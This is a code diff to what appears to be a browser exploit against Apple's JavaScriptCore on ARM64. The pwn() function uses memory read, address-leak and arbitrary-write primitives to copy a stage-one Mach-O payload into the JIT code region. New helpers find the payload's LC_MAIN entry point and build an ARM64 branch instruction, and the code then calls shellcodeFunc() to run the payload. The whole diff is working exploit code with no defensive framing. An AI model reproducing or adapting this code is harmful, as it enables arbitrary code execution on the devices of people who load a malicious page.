@@ -364,15 +364,50 @@ function pwn() {
     var JITCode = read64(jitCodeAddr + 0x1a8);
     log(`[+] JITCode @ ${JITCode.toString(16)}`);
     
-    let ourArray = new Uint8Array(stage2.length + 0x4000).fill(0);
+    let alignedAddress = Number((BigInt(JITCode) + BigInt(0x4000)) & BigInt(0xFFFFFFFFFFFFF000));
+    log(`[*] JITCode aligned @ 0x${alignedAddress.toString(16)}`);
+    let entryoff = findMainEntryPoint(stage1);
+    log(`[*] entryoff: 0x${entryoff.toString(16)}`);
+    let offset = (alignedAddress - JITCode) + entryoff;
+    log(`[*] offset: 0x${offset.toString(16)}`);
+    let instruction = generate_b_instruction(offset);
+    log(`[*] instruction: 0x${instruction.toString(16)}`);
     
-    stage1.replace(new Int64("0xbadbad10badbad10"), new Int64(JITCode));
-    stage1.replace(new Int64("0xbadbad20badbad20"), new Int64(addrof(ourArray)));
-    stage1.replace(new Int64("0xbadbad30badbad30"), new Int64(addrof(stage2)));
-    stage1.replace(new Int64("0xbadbad40badbad40"), new Int64(stage2.length));
+    let ourArray = new Uint8Array(stage1.length + 0x4000).fill(0);
+    ourArray.set(stage1, alignedAddress - JITCode);
+    let view = new DataView(ourArray.buffer);
+    view.setUint32(0, instruction, true);
     
-    ArbitraryWrite(JITCode, stage1);
-    shellcodeFunc();
     ArbitraryWrite(JITCode, ourArray);
     shellcodeFunc();
+}
+
+function findMainEntryPoint(machOArray) {
+    const LC_MAIN = 0x80000028;
+    
+    let dataView = new DataView(machOArray.buffer);
+    let magic = dataView.getUint32(0x0, true);
+    let ncmds = dataView.getUint32(0x10, true);
+    
+    log(`[*] magic: 0x${magic.toString(16)}`);
+    log(`[*] ncmds: ${ncmds}`);
+    
+    var offset = 32;
+    for (let i = 0; i < ncmds; i++) {
+        let cmd = dataView.getUint32(offset + 0x0, true);
+        let cmdsize = dataView.getUint32(offset + 0x4, true);
+        if (cmd === LC_MAIN) {
+            let entryoff = dataView.getUint32(offset + 0x8, true);
+            return entryoff;
+        }
+        offset += cmdsize;
+    }
+    throw new Error(`didn't find main entry point!`);
+    return 0;
+}
+
+function generate_b_instruction(offset) {
+    let imm26 = offset / 4;
+    let instruction = 0x14000000 | (imm26 & 0x03FFFFFF);
+    return instruction;
 }
